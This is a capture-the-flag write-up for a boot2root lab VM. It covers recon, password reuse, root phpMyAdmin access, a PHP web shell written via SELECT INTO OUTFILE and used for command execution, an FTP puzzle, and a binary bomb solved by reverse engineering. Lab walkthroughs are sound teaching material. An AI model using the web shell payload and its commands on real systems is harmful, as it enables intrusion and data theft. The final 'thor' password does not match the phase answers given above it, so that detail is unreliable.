# Boot2Root Privilege Escalation Challenge - Writeup

## Step 1: Network Reconnaissance - Finding the Target

### Discovering the VM's IP Address

First, we need to find the IP address of the target virtual machine on our local network.

**Scan the local network:**
```bash
nmap -sn 192.168.1.0/24
```

**Output:**
```
Starting Nmap 7.92 ( https://nmap.org ) at 2025-12-13 17:23 +01
Nmap scan report for _gateway (192.168.1.1)
Host is up (0.0027s latency).
Nmap scan report for 192.168.1.107
Host is up (0.00036s latency).
Nmap scan report for dhcppc8 (192.168.1.108)
Host is up (0.000085s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 3.34 seconds
```

**Target identified:** `192.168.1.107`

### Scanning for Open Ports and Services

Next, we perform a service version scan on the target:

```bash
nmap -sV 192.168.1.107
```

**Output:**
```
Starting Nmap 7.92 ( https://nmap.org ) at 2025-12-13 17:24 +01
Nmap scan report for 192.168.1.107
Host is up (0.00022s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT    STATE SERVICE    VERSION
21/tcp  open  ftp        vsftpd 2.0.8 or later
22/tcp  open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http       Apache httpd 2.2.22 ((Ubuntu))
143/tcp open  imap       Dovecot imapd
443/tcp open  ssl/http   Apache httpd 2.2.22
993/tcp open  ssl/imaps?
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Key findings:**
- FTP service (port 21)
- SSH service (port 22)
- HTTP/HTTPS web server (ports 80/443)
- Email services (IMAP on 143, IMAPS on 993)

---

## Step 2: Web Application Enumeration

### Exploring the Website

Navigate to `https://192.168.1.107` in a browser. Use directory enumeration tools (like dirbuster or manual exploration) to discover subdirectories:

**Discovered endpoints:**
- `https://192.168.1.107/forum/`
- `https://192.168.1.107/phpmyadmin/`
- `https://192.168.1.107/webmail/`

---

## Step 3: Credential Discovery - Forum

### Finding Credentials in Forum Posts

While browsing the forum at `https://192.168.1.107/forum/`, we discover a post containing connection logs where a user accidentally entered their password in the username field.

**Credentials found:**
- **Username:** `lmezard`
- **Password:** `!q\]Ej?*5K5cy*AJ`

### Accessing the Forum Account

Log into the forum using these credentials to gain access to lmezard's account.

**Key finding:** The forum profile reveals an email address associated with this account: `laurie@borntosec.net`

---

## Step 4: Email Access - SquirrelMail

### Accessing the Webmail

Navigate to `https://192.168.1.107/webmail/` and attempt to log in.

**Hypothesis:** Users often reuse passwords across services.

**Credentials:**
- **Email:** `laurie@borntosec.net`
- **Password:** `!q\]Ej?*5K5cy*AJ`

**Result:** Successfully logged into SquirrelMail!

### Finding Database Credentials

In the inbox, we find an important email:

```
Subject: DB Access
From: qudevide@mail.borntosec.net
Date: Thu, October 8, 2015 11:25 pm
To: laurie@borntosec.net

Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
```

**Database credentials obtained:**
- **Username:** `root`
- **Password:** `Fg-'kKXBj87E:aJ$`

---

## Step 5: Database Access - phpMyAdmin

### Logging into phpMyAdmin

Navigate to `https://192.168.1.107/phpmyadmin/` and log in with the database credentials.

**Access level:** Full root database privileges

---

## Step 6: Gaining Command Execution - Web Shell Upload

### Understanding the Attack Vector

With root database access, we can use MySQL's file writing capabilities to create a PHP web shell that allows us to execute system commands.

**Key concepts:**
- MySQL's `SELECT ... INTO OUTFILE` can write files to disk
- The database runs as the `www-data` user
- We need a web-accessible directory that's writable

### Creating the Web Shell

**SQL Query executed in phpMyAdmin:**
```sql
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/forum/templates_c/shell.php';
```

**Why this path?**
- `/var/www/forum/` is where the forum application lives
- `templates_c/` is a cache directory used by template engines (like Smarty)
- Cache directories typically need write permissions for the web server

### Accessing the Web Shell

Navigate to: `https://192.168.1.107/forum/templates_c/shell.php?cmd=whoami`

**Result:** Command execution achieved! The server responds with output from the `whoami` command.

---

## Step 7: System Enumeration as www-data

### Gathering Information

Now that we can execute commands, we enumerate the system:

**Check current user:**
```
https://192.168.1.107/forum/templates_c/shell.php?cmd=whoami
```
Output: `www-data`

**List home directories:**
```
https://192.168.1.107/forum/templates_c/shell.php?cmd=ls /home
```

**Discovered users:**
- lmezard
- laurie
- thor
- zaz
- (possibly others)

### Finding Credentials

**Search for interesting files:**
```
https://192.168.1.107/forum/templates_c/shell.php?cmd=ls -la /home/
```

**Check for readable files:**
```
https://192.168.1.107/forum/templates_c/shell.php?cmd=find /home -type f -readable 2>/dev/null
```

**Key discovery:** A directory named `LOOKATME` exists

**Read the password file:**
```
https://192.168.1.107/forum/templates_c/shell.php?cmd=cat /home/LOOKATME/password
```

**Output:** `lmezard:G!@M6f4Eatau{sF"`

**New credentials obtained:**
- **Username:** `lmezard`
- **Password:** `G!@M6f4Eatau{sF"`

---

## Step 8: FTP Access - The "fun" File

### Attempting SSH Access

First, we try SSH with the new credentials:
```bash
ssh lmezard@192.168.1.107
```
**Result:** Authentication failed

### Trying FTP Instead

Since port 21 (FTP) is open, we try those credentials there:
```bash
ftp 192.168.1.107
```
**Username:** `lmezard`  
**Password:** `G!@M6f4Eatau{sF"`

**Result:** Successfully connected!

### Discovering Files

**FTP commands:**
```
ftp> ls
```

**Files found:**
- `README`
- `fun`

**Download the files:**
```
ftp> get README
ftp> get fun
ftp> quit
```

---

## Step 9: The "fun" Puzzle

### Analyzing the File

**Check file type:**
```bash
file fun
```
**Output:** `fun: POSIX tar archive (GNU)`

### Extracting the Archive

```bash
tar -xvf fun
```

**Result:** Hundreds of small files are extracted (PCAP-like files containing code snippets)

### Understanding the Puzzle

Each file contains a small piece of C code with hints about the ordering. The files need to be assembled in the correct sequence.

### Assembling the Code

**Script to combine files in order:**
```bash
grep -l 'file' * \
| awk -F'file' '\
  {\
    cmd = "grep -m1 file \"" $0 "\""\
    cmd | getline line\
    close(cmd)\
    split(line, a, "file")\
    print a[2] "\t" $0\
  }\
' \
| sort -n \
| cut -f2- \
| xargs cat > fun.c
```

This script:
1. Finds the ordering hints in each file
2. Sorts them numerically
3. Concatenates them in order

### Compiling and Running

**Fix any syntax errors in the code, then compile:**
```bash
gcc fun.c -o fun
./fun
```

**Output:**
```
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit
```

### Creating the Password Hash

```bash
echo -n "Iheartpwnage" | sha256sum
```

**Result:** `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`

---

## Step 10: SSH Access as laurie

### Determining the User

The password was found in lmezard's FTP, but it's likely for another user. Remember the email address we found earlier: `laurie@borntosec.net`

### Logging in via SSH

```bash
ssh laurie@192.168.1.107
```
**Password:** `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`

**Result:** Successfully logged in as `laurie`!

---

## Step 11: The Bomb Challenge

### Discovering the Files

**In laurie's home directory:**
```bash
ls -la ~/
```

**Files found:**
- `README`
- `bomb` (executable binary)

### Reading the Instructions

```bash
cat README
```

```bash
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).
```

The README explains that this is a "binary bomb" - a reverse engineering challenge with 6 phases. Each phase requires specific input, and wrong answers cause the program to "explode."


decompiling the binary bomb using BinaryNinja we found 6 phases:


## Phase 1

this one does a simple comparison with a fixed string 'Public speaking is very easy.'

## Phase 2

### What the code does

* It reads **six integers** from your input into an array `var_1c[6]` via `read_six_numbers(arg1, &var_1c)`.
* It immediately checks:

```c
if (var_1c[0] != 1) explode_bomb();
```

So the first number **must be 1**.

### The loop constraint

Then it loops `i = 1..5` and computes a `result` intended to reference the previous array element (Binary Ninja produced a weird stack-based expression, but the pattern is standard):

```c
result = (i + 1) * previous_value;
if (var_1c[i] != result) explode_bomb();
```

Interpreted recurrence:

[
a[i] = (i+1)\cdot a[i-1]
]

### Deriving the six numbers

Start with:

* `a0 = 1`

Then:

* `a1 = 2 * 1 = 2`
* `a2 = 3 * 2 = 6`
* `a3 = 4 * 6 = 24`
* `a4 = 5 * 24 = 120`
* `a5 = 6 * 120 = 720`

✅ **Phase 2 input:**

```
1 2 6 24 120 720
```

---

## Phase 3

### What the code does

It parses three values:

```c
sscanf(arg1, "%d %c %d", &result_1, &var_9, &var_8)
```

So your input must be:

```
<index> <character> <number>
```

It requires all 3 items parse successfully (`<=2` explodes).

### Index constraint

```c
if (result_1 > 7) explode_bomb();
```

So `index` must be `0..7`.

### Switch table behavior

For each case `0..7`:

* It sets `ebx` to an ASCII value (a character).
* It checks `var_8` equals a specific constant.
* After the switch, it checks:

```c
if (ebx == var_9) return;
else explode_bomb();
```

Meaning: **the character you typed must match the case’s expected ASCII char**, and the third integer must match exactly.

### Case mapping (hex → decimal + ASCII)

* Case 0: `ebx=0x71` → `'q'`, and `var_8 == 0x309` → `777`
* Case 1: `ebx=0x62` → `'b'`, and `var_8 == 0x0d6` → `214`
* Case 2: `ebx=0x62` → `'b'`, and `var_8 == 0x2f3` → `755`
* Case 3: `ebx=0x6b` → `'k'`, and `var_8 == 0x0fb` → `251`
* Case 4: `ebx=0x6f` → `'o'`, and `var_8 == 0x0a0` → `160`
* Case 5: `ebx=0x74` → `'t'`, and `var_8 == 0x1ca` → `458`
* Case 6: `ebx=0x76` → `'v'`, and `var_8 == 0x30c` → `780`
* Case 7: `ebx=0x62` → `'b'`, and `var_8 == 0x20c` → `524`

✅ **Any one of these works:**

```
0 q 777
1 b 214
2 b 755
3 k 251
4 o 160
5 t 458
6 v 780
7 b 524
```

(For a writeup, it’s fine to pick one, e.g. `3 k 251`.)

---

## Phase 4

### What the code does

It parses a single integer:

```c
sscanf(arg1, "%d", &var_8) == 1 && var_8 > 0
```

So you must enter **one positive integer**.

Then it computes:

```c
result = func4(var_8);
if (result == 0x37) pass; else explode;
```

So we need:
[
func4(x) = 0x37
]
And `0x37` in decimal is:
[
0x37 = 55
]

### Understanding func4

```c
if (arg1 <= 1) return 1;
return func4(arg1 - 2) + func4(arg1 - 1);
```

This is Fibonacci-style recursion with:

* `F(0)=1`
* `F(1)=1`

So:

* `F(2)=2`
* `F(3)=3`
* `F(4)=5`
* `F(5)=8`
* `F(6)=13`
* `F(7)=21`
* `F(8)=34`
* `F(9)=55`

So `func4(9)=55`.

✅ **Phase 4 input:**

```
9
```

---

## Phase 5

### What the code does

It requires input length exactly 6:

```c
if (string_length(arg1) != 6) explode;
```

Then for each of the 6 characters:

1. Takes the character byte
2. Masks low 4 bits (`& 0xF`)
3. Uses that as an index into a 16-char table:

```c
array = "isrveawhobpnutfg"
```

Then it builds a new 6-character string `var_c` and compares it to `"giants"`:

```c
if (strings_not_equal(var_c, "giants")) explode;
```

So we need the transformation to produce:

```
giants
```

### Table indexing

Index the table (0..15):

```
0:i 1:s 2:r 3:v 4:e 5:a 6:w 7:h 8:o 9:b 10:p 11:n 12:u 13:t 14:f 15:g
```

To produce `"giants"`, we need indices:

* `g` → 15
* `i` → 0
* `a` → 5
* `n` → 11
* `t` → 13
* `s` → 1

So for each input character `c`:
[
(c \ &\ 0xF) = [15, 0, 5, 11, 13, 1]
]

### Choose any characters with those low nibbles

One clean printable choice:

* low nibble `F` → `'o'` (0x6F)
* low nibble `0` → `'p'` (0x70)
* low nibble `5` → `'u'` (0x75)
* low nibble `B` → `'k'` (0x6B)
* low nibble `D` → `'m'` (0x6D)
* low nibble `1` → `'a'` (0x61)

These give indices `[15,0,5,11,13,1]` → `"giants"`.

✅ **Phase 5 input:**

```
opukma
```

---

## Phase 6

### What the code does (high level)

1. Reads six numbers: `var_1c[6]`.
2. Validates:

   * Each number is in `1..6`
   * All numbers are unique (no duplicates)
3. Treats each number as a **position** in a linked list starting at `node1`.

   * For each input `k`, it walks `k-1` times via `next` pointer to select the kth node.
4. Stores those selected nodes into `var_34[6]`.
5. Relinks them in that exact order (builds a new list).
6. Checks the new list is sorted **descending** by node value.

### Input validation

```c
if (var_1c[i] - 1 > 5) explode;   // means var_1c[i] must be 1..6
if any duplicates explode;
```

So input must be a permutation of `1 2 3 4 5 6`.

### Node values

we get the node values by decompiling the binary with gdb, running `info variables` to see variables names then running p node1...6 and got these

* node1 (index 1): 253
* node2 (index 2): 725
* node3 (index 3): 301
* node4 (index 4): 997
* node5 (index 5): 212
* node6 (index 6): 432


### The ordering constraint

This is the critical check:

```c
result = *esi_6;               // current node value
if (result < *esi_6[2]) explode_bomb(); // compare to next node value
```

Interpreting intent: for each adjacent pair:
[
value(current) \ge value(next)
]
So the new list must be **descending**.

### Sort nodes by value (descending)

Values descending:

1. 997 → node4
2. 725 → node2
3. 432 → node6
4. 301 → node3
5. 253 → node1
6. 212 → node5

So the input must specify their indices in that order.

✅ **Phase 6 input:**

```
4 2 6 3 1 5
```

---

## Final set

* **Phase 1:** `Public speaking is very easy.`
* **Phase 2:** `1 2 6 24 120 720`
* **Phase 3:** (choice based on the readme hint) `1 b 214`
* **Phase 4:** `9`
* **Phase 5:** `opukma`
* **Phase 6:** `4 2 6 3 1 5`

so the passowrd for user `thor` is `Publicspeakingisveryeasy.126241207201b2149opekmq426135`

------------------


logging to user `thor` we got a readme, which says to finish this challenge and use the result as password for `zaz` user, and a turtle file with some weird instructions and a message saying `Can you digest the message? :)` which suggests hashing whatever we get from the text above.

doing some research I found out that the turtle file is from the language logo, which is an educational programming language, designed in 1967, and we just have to do some text correction, like `Tourne droite de 90 degrees` should be `RT 90`, so doing that we get the content of the file turtle.logo, and running that in a Logo interperter online[https://turtlecoder.com/] we see it draw the word SLASH, and hashing it we get `646da671ca01bb5d84dbb5fb2238dc8e` which is the `zaz`'s password


------------------


logging to user `zaz` we find a binary exploit_me 